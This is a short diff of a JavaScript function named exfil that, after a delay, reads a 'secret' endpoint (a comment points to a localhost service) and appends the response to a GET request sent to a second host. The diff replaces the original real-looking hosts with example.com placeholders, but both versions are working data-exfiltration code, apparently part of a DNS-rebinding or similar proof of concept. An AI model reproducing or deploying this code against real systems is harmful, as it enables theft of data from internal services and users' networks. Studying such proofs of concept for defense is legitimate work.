@@ -7,11 +7,11 @@ function exfil(ip) {
     setTimeout(function() {
         var xmlhttp = new XMLHttpRequest();
         // http://127.0.0.1:8080/secret
-        xmlhttp.open("GET", "http://0xbu.com:8080/secret", false);
+        xmlhttp.open("GET", "http://example.com:8000", false);
         xmlhttp.send();
         var data = xmlhttp.responseText;
         // Cors enabled on this domain
-        xmlhttp.open("GET", "http://robo.eugenekolo.com:3000/hi"+data, false);
+        xmlhttp.open("GET", "http://2.example.com:3000/hi"+data, false);
         xmlhttp.send();
     }, 70000);
 }
